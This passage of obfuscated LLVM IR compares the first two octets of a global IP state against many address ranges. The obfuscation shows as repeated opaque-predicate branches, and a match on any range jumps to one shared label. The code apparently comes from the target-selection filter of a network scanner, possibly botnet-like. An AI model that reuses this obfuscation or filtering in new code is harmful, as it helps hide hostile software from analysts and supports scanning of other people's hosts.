  %748 = zext i8 %747 to i32
  %749 = icmp eq i32 %748, 168
  br i1 %749, label %750, label %754

; <label>:750:                                    ; preds = %746
  %751 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %752 = zext i8 %751 to i32
  %753 = icmp eq i32 %752, 68
  br i1 %753, label %4994, label %754

; <label>:754:                                    ; preds = %750, %746
  %755 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %756 = zext i8 %755 to i32
  %757 = icmp eq i32 %756, 168
  br i1 %757, label %758, label %762

; <label>:758:                                    ; preds = %754
  %759 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %760 = zext i8 %759 to i32
  %761 = icmp eq i32 %760, 85
  br i1 %761, label %4994, label %762

; <label>:762:                                    ; preds = %758, %754
  %763 = load i32, i32* @x.69
  %764 = load i32, i32* @y.70
  %765 = sub i32 %763, 1
  %766 = mul i32 %763, %765
  %767 = urem i32 %766, 2
  %768 = icmp eq i32 %767, 0
  %769 = icmp slt i32 %764, 10
  %770 = or i1 %768, %769
  br i1 %770, label %originalBB116, label %originalBB116alteredBB

originalBB116:                                    ; preds = %originalBB116alteredBB, %762
  %771 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %772 = zext i8 %771 to i32
  %773 = icmp eq i32 %772, 168
  %774 = load i32, i32* @x.69
  %775 = load i32, i32* @y.70
  %776 = sub i32 %774, 1
  %777 = mul i32 %774, %776
  %778 = urem i32 %777, 2
  %779 = icmp eq i32 %778, 0
  %780 = icmp slt i32 %775, 10
  %781 = or i1 %779, %780
  br i1 %781, label %originalBBpart2118, label %originalBB116alteredBB

originalBBpart2118:                               ; preds = %originalBB116
  br i1 %773, label %782, label %802

; <label>:782:                                    ; preds = %originalBBpart2118
  %783 = load i32, i32* @x.69
  %784 = load i32, i32* @y.70
  %785 = sub i32 %783, 1
  %786 = mul i32 %783, %785
  %787 = urem i32 %786, 2
  %788 = icmp eq i32 %787, 0
  %789 = icmp slt i32 %784, 10
  %790 = or i1 %788, %789
  br i1 %790, label %originalBB120, label %originalBB120alteredBB

originalBB120:                                    ; preds = %originalBB120alteredBB, %782
  %791 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %792 = zext i8 %791 to i32
  %793 = icmp eq i32 %792, 102
  %794 = load i32, i32* @x.69
  %795 = load i32, i32* @y.70
  %796 = sub i32 %794, 1
  %797 = mul i32 %794, %796
  %798 = urem i32 %797, 2
  %799 = icmp eq i32 %798, 0
  %800 = icmp slt i32 %795, 10
  %801 = or i1 %799, %800
  br i1 %801, label %originalBBpart2122, label %originalBB120alteredBB

originalBBpart2122:                               ; preds = %originalBB120
  br i1 %793, label %4994, label %802

; <label>:802:                                    ; preds = %originalBBpart2122, %originalBBpart2118
  %803 = load i32, i32* @x.69
  %804 = load i32, i32* @y.70
  %805 = sub i32 %803, 1
  %806 = mul i32 %803, %805
  %807 = urem i32 %806, 2
  %808 = icmp eq i32 %807, 0
  %809 = icmp slt i32 %804, 10
  %810 = or i1 %808, %809
  br i1 %810, label %originalBB124, label %originalBB124alteredBB

originalBB124:                                    ; preds = %originalBB124alteredBB, %802
  %811 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %812 = zext i8 %811 to i32
  %813 = icmp eq i32 %812, 203
  %814 = load i32, i32* @x.69
  %815 = load i32, i32* @y.70
  %816 = sub i32 %814, 1
  %817 = mul i32 %814, %816
  %818 = urem i32 %817, 2
  %819 = icmp eq i32 %818, 0
  %820 = icmp slt i32 %815, 10
  %821 = or i1 %819, %820
  br i1 %821, label %originalBBpart2126, label %originalBB124alteredBB

originalBBpart2126:                               ; preds = %originalBB124
  br i1 %813, label %822, label %826

; <label>:822:                                    ; preds = %originalBBpart2126
  %823 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %824 = zext i8 %823 to i32
  %825 = icmp eq i32 %824, 59
  br i1 %825, label %4994, label %826

; <label>:826:                                    ; preds = %822, %originalBBpart2126
  %827 = load i32, i32* @x.69
  %828 = load i32, i32* @y.70
  %829 = sub i32 %827, 1
  %830 = mul i32 %827, %829
  %831 = urem i32 %830, 2
  %832 = icmp eq i32 %831, 0
  %833 = icmp slt i32 %828, 10
  %834 = or i1 %832, %833
  br i1 %834, label %originalBB128, label %originalBB128alteredBB

originalBB128:                                    ; preds = %originalBB128alteredBB, %826
  %835 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %836 = zext i8 %835 to i32
  %837 = icmp eq i32 %836, 204
  %838 = load i32, i32* @x.69
  %839 = load i32, i32* @y.70
  %840 = sub i32 %838, 1
  %841 = mul i32 %838, %840
  %842 = urem i32 %841, 2
  %843 = icmp eq i32 %842, 0
  %844 = icmp slt i32 %839, 10
  %845 = or i1 %843, %844
  br i1 %845, label %originalBBpart2130, label %originalBB128alteredBB

originalBBpart2130:                               ; preds = %originalBB128
  br i1 %837, label %846, label %866

; <label>:846:                                    ; preds = %originalBBpart2130
  %847 = load i32, i32* @x.69
  %848 = load i32, i32* @y.70
  %849 = sub i32 %847, 1
  %850 = mul i32 %847, %849
  %851 = urem i32 %850, 2
  %852 = icmp eq i32 %851, 0
  %853 = icmp slt i32 %848, 10
  %854 = or i1 %852, %853
  br i1 %854, label %originalBB132, label %originalBB132alteredBB

originalBB132:                                    ; preds = %originalBB132alteredBB, %846
  %855 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %856 = zext i8 %855 to i32
  %857 = icmp eq i32 %856, 34
  %858 = load i32, i32* @x.69
  %859 = load i32, i32* @y.70
  %860 = sub i32 %858, 1
  %861 = mul i32 %858, %860
  %862 = urem i32 %861, 2
  %863 = icmp eq i32 %862, 0
  %864 = icmp slt i32 %859, 10
  %865 = or i1 %863, %864
  br i1 %865, label %originalBBpart2134, label %originalBB132alteredBB

originalBBpart2134:                               ; preds = %originalBB132
  br i1 %857, label %4994, label %866

; <label>:866:                                    ; preds = %originalBBpart2134, %originalBBpart2130
  %867 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %868 = zext i8 %867 to i32
  %869 = icmp eq i32 %868, 207
  br i1 %869, label %870, label %890

; <label>:870:                                    ; preds = %866
  %871 = load i32, i32* @x.69
  %872 = load i32, i32* @y.70
  %873 = sub i32 %871, 1
  %874 = mul i32 %871, %873
  %875 = urem i32 %874, 2
  %876 = icmp eq i32 %875, 0
  %877 = icmp slt i32 %872, 10
  %878 = or i1 %876, %877
  br i1 %878, label %originalBB136, label %originalBB136alteredBB

originalBB136:                                    ; preds = %originalBB136alteredBB, %870
  %879 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %880 = zext i8 %879 to i32
  %881 = icmp eq i32 %880, 30
  %882 = load i32, i32* @x.69
  %883 = load i32, i32* @y.70
  %884 = sub i32 %882, 1
  %885 = mul i32 %882, %884
  %886 = urem i32 %885, 2
  %887 = icmp eq i32 %886, 0
  %888 = icmp slt i32 %883, 10
  %889 = or i1 %887, %888
  br i1 %889, label %originalBBpart2138, label %originalBB136alteredBB

originalBBpart2138:                               ; preds = %originalBB136
  br i1 %881, label %4994, label %890

; <label>:890:                                    ; preds = %originalBBpart2138, %866
  %891 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %892 = zext i8 %891 to i32
  %893 = icmp eq i32 %892, 117
  br i1 %893, label %894, label %898

; <label>:894:                                    ; preds = %890
  %895 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %896 = zext i8 %895 to i32
  %897 = icmp eq i32 %896, 55
  br i1 %897, label %4994, label %898

; <label>:898:                                    ; preds = %894, %890
  %899 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %900 = zext i8 %899 to i32
  %901 = icmp eq i32 %900, 117
  br i1 %901, label %902, label %922

; <label>:902:                                    ; preds = %898
  %903 = load i32, i32* @x.69
  %904 = load i32, i32* @y.70
  %905 = sub i32 %903, 1
  %906 = mul i32 %903, %905
  %907 = urem i32 %906, 2
  %908 = icmp eq i32 %907, 0
  %909 = icmp slt i32 %904, 10
  %910 = or i1 %908, %909
  br i1 %910, label %originalBB140, label %originalBB140alteredBB

originalBB140:                                    ; preds = %originalBB140alteredBB, %902
  %911 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %912 = zext i8 %911 to i32
  %913 = icmp eq i32 %912, 56
  %914 = load i32, i32* @x.69
  %915 = load i32, i32* @y.70
  %916 = sub i32 %914, 1
  %917 = mul i32 %914, %916
  %918 = urem i32 %917, 2
  %919 = icmp eq i32 %918, 0
  %920 = icmp slt i32 %915, 10
  %921 = or i1 %919, %920
  br i1 %921, label %originalBBpart2142, label %originalBB140alteredBB

originalBBpart2142:                               ; preds = %originalBB140
  br i1 %913, label %4994, label %922

; <label>:922:                                    ; preds = %originalBBpart2142, %898
  %923 = load i32, i32* @x.69
  %924 = load i32, i32* @y.70
  %925 = sub i32 %923, 1
  %926 = mul i32 %923, %925
  %927 = urem i32 %926, 2
  %928 = icmp eq i32 %927, 0
  %929 = icmp slt i32 %924, 10
  %930 = or i1 %928, %929
  br i1 %930, label %originalBB144, label %originalBB144alteredBB

originalBB144:                                    ; preds = %originalBB144alteredBB, %922
  %931 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %932 = zext i8 %931 to i32
  %933 = icmp eq i32 %932, 80
  %934 = load i32, i32* @x.69
  %935 = load i32, i32* @y.70
  %936 = sub i32 %934, 1
  %937 = mul i32 %934, %936
  %938 = urem i32 %937, 2
  %939 = icmp eq i32 %938, 0
  %940 = icmp slt i32 %935, 10
  %941 = or i1 %939, %940
  br i1 %941, label %originalBBpart2146, label %originalBB144alteredBB

originalBBpart2146:                               ; preds = %originalBB144
  br i1 %933, label %942, label %962

; <label>:942:                                    ; preds = %originalBBpart2146
  %943 = load i32, i32* @x.69
  %944 = load i32, i32* @y.70
  %945 = sub i32 %943, 1
  %946 = mul i32 %943, %945
  %947 = urem i32 %946, 2
  %948 = icmp eq i32 %947, 0
  %949 = icmp slt i32 %944, 10
  %950 = or i1 %948, %949
  br i1 %950, label %originalBB148, label %originalBB148alteredBB

originalBB148:                                    ; preds = %originalBB148alteredBB, %942
  %951 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %952 = zext i8 %951 to i32
  %953 = icmp eq i32 %952, 235
  %954 = load i32, i32* @x.69
  %955 = load i32, i32* @y.70
  %956 = sub i32 %954, 1
  %957 = mul i32 %954, %956
  %958 = urem i32 %957, 2
  %959 = icmp eq i32 %958, 0
  %960 = icmp slt i32 %955, 10
  %961 = or i1 %959, %960
  br i1 %961, label %originalBBpart2150, label %originalBB148alteredBB

originalBBpart2150:                               ; preds = %originalBB148
  br i1 %953, label %4994, label %962

; <label>:962:                                    ; preds = %originalBBpart2150, %originalBBpart2146
  %963 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %964 = zext i8 %963 to i32
  %965 = icmp eq i32 %964, 207
  br i1 %965, label %966, label %970

; <label>:966:                                    ; preds = %962
  %967 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %968 = zext i8 %967 to i32
  %969 = icmp eq i32 %968, 120
  br i1 %969, label %4994, label %970

; <label>:970:                                    ; preds = %966, %962
  %971 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %972 = zext i8 %971 to i32
  %973 = icmp eq i32 %972, 209
  br i1 %973, label %974, label %978

; <label>:974:                                    ; preds = %970
  %975 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %976 = zext i8 %975 to i32
  %977 = icmp eq i32 %976, 35
  br i1 %977, label %4994, label %978

; <label>:978:                                    ; preds = %974, %970
  %979 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %980 = zext i8 %979 to i32
  %981 = icmp eq i32 %980, 64
  br i1 %981, label %982, label %1002

; <label>:982:                                    ; preds = %978
  %983 = load i32, i32* @x.69
  %984 = load i32, i32* @y.70
  %985 = sub i32 %983, 1
  %986 = mul i32 %983, %985
  %987 = urem i32 %986, 2
  %988 = icmp eq i32 %987, 0
  %989 = icmp slt i32 %984, 10
  %990 = or i1 %988, %989
  br i1 %990, label %originalBB152, label %originalBB152alteredBB

originalBB152:                                    ; preds = %originalBB152alteredBB, %982
  %991 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %992 = zext i8 %991 to i32
  %993 = icmp eq i32 %992, 70
  %994 = load i32, i32* @x.69
  %995 = load i32, i32* @y.70
  %996 = sub i32 %994, 1
  %997 = mul i32 %994, %996
  %998 = urem i32 %997, 2
  %999 = icmp eq i32 %998, 0
  %1000 = icmp slt i32 %995, 10
  %1001 = or i1 %999, %1000
  br i1 %1001, label %originalBBpart2154, label %originalBB152alteredBB

originalBBpart2154:                               ; preds = %originalBB152
  br i1 %993, label %4994, label %1002

; <label>:1002:                                   ; preds = %originalBBpart2154, %978
  %1003 = load i32, i32* @x.69
  %1004 = load i32, i32* @y.70
  %1005 = sub i32 %1003, 1
  %1006 = mul i32 %1003, %1005
  %1007 = urem i32 %1006, 2
  %1008 = icmp eq i32 %1007, 0
  %1009 = icmp slt i32 %1004, 10
  %1010 = or i1 %1008, %1009
  br i1 %1010, label %originalBB156, label %originalBB156alteredBB

originalBB156:                                    ; preds = %originalBB156alteredBB, %1002
  %1011 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1012 = zext i8 %1011 to i32
  %1013 = icmp eq i32 %1012, 172
  %1014 = load i32, i32* @x.69
  %1015 = load i32, i32* @y.70
  %1016 = sub i32 %1014, 1
  %1017 = mul i32 %1014, %1016
  %1018 = urem i32 %1017, 2
  %1019 = icmp eq i32 %1018, 0
  %1020 = icmp slt i32 %1015, 10
  %1021 = or i1 %1019, %1020
  br i1 %1021, label %originalBBpart2158, label %originalBB156alteredBB

originalBBpart2158:                               ; preds = %originalBB156
  br i1 %1013, label %1022, label %1046

; <label>:1022:                                   ; preds = %originalBBpart2158
  %1023 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1024 = zext i8 %1023 to i32
  %1025 = icmp sge i32 %1024, 16
  br i1 %1025, label %1026, label %1046

; <label>:1026:                                   ; preds = %1022
  %1027 = load i32, i32* @x.69
  %1028 = load i32, i32* @y.70
  %1029 = sub i32 %1027, 1
  %1030 = mul i32 %1027, %1029
  %1031 = urem i32 %1030, 2
  %1032 = icmp eq i32 %1031, 0
  %1033 = icmp slt i32 %1028, 10
  %1034 = or i1 %1032, %1033
  br i1 %1034, label %originalBB160, label %originalBB160alteredBB

originalBB160:                                    ; preds = %originalBB160alteredBB, %1026
  %1035 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1036 = zext i8 %1035 to i32
  %1037 = icmp slt i32 %1036, 32
  %1038 = load i32, i32* @x.69
  %1039 = load i32, i32* @y.70
  %1040 = sub i32 %1038, 1
  %1041 = mul i32 %1038, %1040
  %1042 = urem i32 %1041, 2
  %1043 = icmp eq i32 %1042, 0
  %1044 = icmp slt i32 %1039, 10
  %1045 = or i1 %1043, %1044
  br i1 %1045, label %originalBBpart2162, label %originalBB160alteredBB

originalBBpart2162:                               ; preds = %originalBB160
  br i1 %1037, label %4994, label %1046

; <label>:1046:                                   ; preds = %originalBBpart2162, %1022, %originalBBpart2158
  %1047 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1048 = zext i8 %1047 to i32
  %1049 = icmp eq i32 %1048, 100
  br i1 %1049, label %1050, label %1074

; <label>:1050:                                   ; preds = %1046
  %1051 = load i32, i32* @x.69
  %1052 = load i32, i32* @y.70
  %1053 = sub i32 %1051, 1
  %1054 = mul i32 %1051, %1053
  %1055 = urem i32 %1054, 2
  %1056 = icmp eq i32 %1055, 0
  %1057 = icmp slt i32 %1052, 10
  %1058 = or i1 %1056, %1057
  br i1 %1058, label %originalBB164, label %originalBB164alteredBB

originalBB164:                                    ; preds = %originalBB164alteredBB, %1050
  %1059 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1060 = zext i8 %1059 to i32
  %1061 = icmp sge i32 %1060, 64
  %1062 = load i32, i32* @x.69
  %1063 = load i32, i32* @y.70
  %1064 = sub i32 %1062, 1
  %1065 = mul i32 %1062, %1064
  %1066 = urem i32 %1065, 2
  %1067 = icmp eq i32 %1066, 0
  %1068 = icmp slt i32 %1063, 10
  %1069 = or i1 %1067, %1068
  br i1 %1069, label %originalBBpart2166, label %originalBB164alteredBB

originalBBpart2166:                               ; preds = %originalBB164
  br i1 %1061, label %1070, label %1074

; <label>:1070:                                   ; preds = %originalBBpart2166
  %1071 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1072 = zext i8 %1071 to i32
  %1073 = icmp slt i32 %1072, 127
  br i1 %1073, label %4994, label %1074

; <label>:1074:                                   ; preds = %1070, %originalBBpart2166, %1046
  %1075 = load i32, i32* @x.69
  %1076 = load i32, i32* @y.70
  %1077 = sub i32 %1075, 1
  %1078 = mul i32 %1075, %1077
  %1079 = urem i32 %1078, 2
  %1080 = icmp eq i32 %1079, 0
  %1081 = icmp slt i32 %1076, 10
  %1082 = or i1 %1080, %1081
  br i1 %1082, label %originalBB168, label %originalBB168alteredBB

originalBB168:                                    ; preds = %originalBB168alteredBB, %1074
  %1083 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1084 = zext i8 %1083 to i32
  %1085 = icmp eq i32 %1084, 169
  %1086 = load i32, i32* @x.69
  %1087 = load i32, i32* @y.70
  %1088 = sub i32 %1086, 1
  %1089 = mul i32 %1086, %1088
  %1090 = urem i32 %1089, 2
  %1091 = icmp eq i32 %1090, 0
  %1092 = icmp slt i32 %1087, 10
  %1093 = or i1 %1091, %1092
  br i1 %1093, label %originalBBpart2170, label %originalBB168alteredBB

originalBBpart2170:                               ; preds = %originalBB168
  br i1 %1085, label %1094, label %1098

; <label>:1094:                                   ; preds = %originalBBpart2170
  %1095 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1096 = zext i8 %1095 to i32
  %1097 = icmp eq i32 %1096, 254
  br i1 %1097, label %4994, label %1098

; <label>:1098:                                   ; preds = %1094, %originalBBpart2170
  %1099 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1100 = zext i8 %1099 to i32
  %1101 = icmp eq i32 %1100, 198
  br i1 %1101, label %1102, label %1110

; <label>:1102:                                   ; preds = %1098
  %1103 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1104 = zext i8 %1103 to i32
  %1105 = icmp sge i32 %1104, 18
  br i1 %1105, label %1106, label %1110

; <label>:1106:                                   ; preds = %1102
  %1107 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1108 = zext i8 %1107 to i32
  %1109 = icmp slt i32 %1108, 20
  br i1 %1109, label %4994, label %1110

; <label>:1110:                                   ; preds = %1106, %1102, %1098
  %1111 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1112 = zext i8 %1111 to i32
  %1113 = icmp eq i32 %1112, 64
  br i1 %1113, label %1114, label %1122

; <label>:1114:                                   ; preds = %1110
  %1115 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1116 = zext i8 %1115 to i32
  %1117 = icmp sge i32 %1116, 69
  br i1 %1117, label %1118, label %1122

; <label>:1118:                                   ; preds = %1114
  %1119 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1120 = zext i8 %1119 to i32
  %1121 = icmp slt i32 %1120, 227
  br i1 %1121, label %4994, label %1122

; <label>:1122:                                   ; preds = %1118, %1114, %1110
  %1123 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1124 = zext i8 %1123 to i32
  %1125 = icmp eq i32 %1124, 128
  br i1 %1125, label %1126, label %1134

; <label>:1126:                                   ; preds = %1122
  %1127 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1128 = zext i8 %1127 to i32
  %1129 = icmp sge i32 %1128, 35
  br i1 %1129, label %1130, label %1134

; <label>:1130:                                   ; preds = %1126
  %1131 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1132 = zext i8 %1131 to i32
  %1133 = icmp slt i32 %1132, 237
  br i1 %1133, label %4994, label %1134

; <label>:1134:                                   ; preds = %1130, %1126, %1122
  %1135 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1136 = zext i8 %1135 to i32
  %1137 = icmp eq i32 %1136, 129
  br i1 %1137, label %1138, label %1146

; <label>:1138:                                   ; preds = %1134
  %1139 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1140 = zext i8 %1139 to i32
  %1141 = icmp sge i32 %1140, 22
  br i1 %1141, label %1142, label %1146

; <label>:1142:                                   ; preds = %1138
  %1143 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1144 = zext i8 %1143 to i32
  %1145 = icmp slt i32 %1144, 255
  br i1 %1145, label %4994, label %1146

; <label>:1146:                                   ; preds = %1142, %1138, %1134
  %1147 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1148 = zext i8 %1147 to i32
  %1149 = icmp eq i32 %1148, 130
  br i1 %1149, label %1150, label %1174

; <label>:1150:                                   ; preds = %1146
  %1151 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1152 = zext i8 %1151 to i32
  %1153 = icmp sge i32 %1152, 40
  br i1 %1153, label %1154, label %1174

; <label>:1154:                                   ; preds = %1150
  %1155 = load i32, i32* @x.69
  %1156 = load i32, i32* @y.70
  %1157 = sub i32 %1155, 1
  %1158 = mul i32 %1155, %1157
  %1159 = urem i32 %1158, 2
  %1160 = icmp eq i32 %1159, 0
  %1161 = icmp slt i32 %1156, 10
  %1162 = or i1 %1160, %1161
  br i1 %1162, label %originalBB172, label %originalBB172alteredBB

originalBB172:                                    ; preds = %originalBB172alteredBB, %1154
  %1163 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1164 = zext i8 %1163 to i32
  %1165 = icmp slt i32 %1164, 168
  %1166 = load i32, i32* @x.69
  %1167 = load i32, i32* @y.70
  %1168 = sub i32 %1166, 1
  %1169 = mul i32 %1166, %1168
  %1170 = urem i32 %1169, 2
  %1171 = icmp eq i32 %1170, 0
  %1172 = icmp slt i32 %1167, 10
  %1173 = or i1 %1171, %1172
  br i1 %1173, label %originalBBpart2174, label %originalBB172alteredBB

originalBBpart2174:                               ; preds = %originalBB172
  br i1 %1165, label %4994, label %1174

; <label>:1174:                                   ; preds = %originalBBpart2174, %1150, %1146
  %1175 = load i32, i32* @x.69
  %1176 = load i32, i32* @y.70
  %1177 = sub i32 %1175, 1
  %1178 = mul i32 %1175, %1177
  %1179 = urem i32 %1178, 2
  %1180 = icmp eq i32 %1179, 0
  %1181 = icmp slt i32 %1176, 10
  %1182 = or i1 %1180, %1181
  br i1 %1182, label %originalBB176, label %originalBB176alteredBB

originalBB176:                                    ; preds = %originalBB176alteredBB, %1174
  %1183 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1184 = zext i8 %1183 to i32
  %1185 = icmp eq i32 %1184, 131
  %1186 = load i32, i32* @x.69
  %1187 = load i32, i32* @y.70
  %1188 = sub i32 %1186, 1
  %1189 = mul i32 %1186, %1188
  %1190 = urem i32 %1189, 2
  %1191 = icmp eq i32 %1190, 0
  %1192 = icmp slt i32 %1187, 10
  %1193 = or i1 %1191, %1192
  br i1 %1193, label %originalBBpart2178, label %originalBB176alteredBB

originalBBpart2178:                               ; preds = %originalBB176
  br i1 %1185, label %1194, label %1234

; <label>:1194:                                   ; preds = %originalBBpart2178
  %1195 = load i32, i32* @x.69
  %1196 = load i32, i32* @y.70
  %1197 = sub i32 %1195, 1
  %1198 = mul i32 %1195, %1197
  %1199 = urem i32 %1198, 2
  %1200 = icmp eq i32 %1199, 0
  %1201 = icmp slt i32 %1196, 10
  %1202 = or i1 %1200, %1201
  br i1 %1202, label %originalBB180, label %originalBB180alteredBB

originalBB180:                                    ; preds = %originalBB180alteredBB, %1194
  %1203 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1204 = zext i8 %1203 to i32
  %1205 = icmp sge i32 %1204, 3
  %1206 = load i32, i32* @x.69
  %1207 = load i32, i32* @y.70
  %1208 = sub i32 %1206, 1
  %1209 = mul i32 %1206, %1208
  %1210 = urem i32 %1209, 2
  %1211 = icmp eq i32 %1210, 0
  %1212 = icmp slt i32 %1207, 10
  %1213 = or i1 %1211, %1212
  br i1 %1213, label %originalBBpart2182, label %originalBB180alteredBB

originalBBpart2182:                               ; preds = %originalBB180
  br i1 %1205, label %1214, label %1234

; <label>:1214:                                   ; preds = %originalBBpart2182
  %1215 = load i32, i32* @x.69
  %1216 = load i32, i32* @y.70
  %1217 = sub i32 %1215, 1
  %1218 = mul i32 %1215, %1217
  %1219 = urem i32 %1218, 2
  %1220 = icmp eq i32 %1219, 0
  %1221 = icmp slt i32 %1216, 10
  %1222 = or i1 %1220, %1221
  br i1 %1222, label %originalBB184, label %originalBB184alteredBB

originalBB184:                                    ; preds = %originalBB184alteredBB, %1214
  %1223 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1224 = zext i8 %1223 to i32
  %1225 = icmp slt i32 %1224, 251
  %1226 = load i32, i32* @x.69
  %1227 = load i32, i32* @y.70
  %1228 = sub i32 %1226, 1
  %1229 = mul i32 %1226, %1228
  %1230 = urem i32 %1229, 2
  %1231 = icmp eq i32 %1230, 0
  %1232 = icmp slt i32 %1227, 10
  %1233 = or i1 %1231, %1232
  br i1 %1233, label %originalBBpart2186, label %originalBB184alteredBB

originalBBpart2186:                               ; preds = %originalBB184
  br i1 %1225, label %4994, label %1234

; <label>:1234:                                   ; preds = %originalBBpart2186, %originalBBpart2182, %originalBBpart2178
  %1235 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1236 = zext i8 %1235 to i32
  %1237 = icmp eq i32 %1236, 132
  br i1 %1237, label %1238, label %1262

; <label>:1238:                                   ; preds = %1234
  %1239 = load i32, i32* @x.69
  %1240 = load i32, i32* @y.70
  %1241 = sub i32 %1239, 1
  %1242 = mul i32 %1239, %1241
  %1243 = urem i32 %1242, 2
  %1244 = icmp eq i32 %1243, 0
  %1245 = icmp slt i32 %1240, 10
  %1246 = or i1 %1244, %1245
  br i1 %1246, label %originalBB188, label %originalBB188alteredBB

originalBB188:                                    ; preds = %originalBB188alteredBB, %1238
  %1247 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1248 = zext i8 %1247 to i32
  %1249 = icmp sge i32 %1248, 3
  %1250 = load i32, i32* @x.69
  %1251 = load i32, i32* @y.70
  %1252 = sub i32 %1250, 1
  %1253 = mul i32 %1250, %1252
  %1254 = urem i32 %1253, 2
  %1255 = icmp eq i32 %1254, 0
  %1256 = icmp slt i32 %1251, 10
  %1257 = or i1 %1255, %1256
  br i1 %1257, label %originalBBpart2190, label %originalBB188alteredBB

originalBBpart2190:                               ; preds = %originalBB188
  br i1 %1249, label %1258, label %1262

; <label>:1258:                                   ; preds = %originalBBpart2190
  %1259 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1260 = zext i8 %1259 to i32
  %1261 = icmp slt i32 %1260, 251
  br i1 %1261, label %4994, label %1262

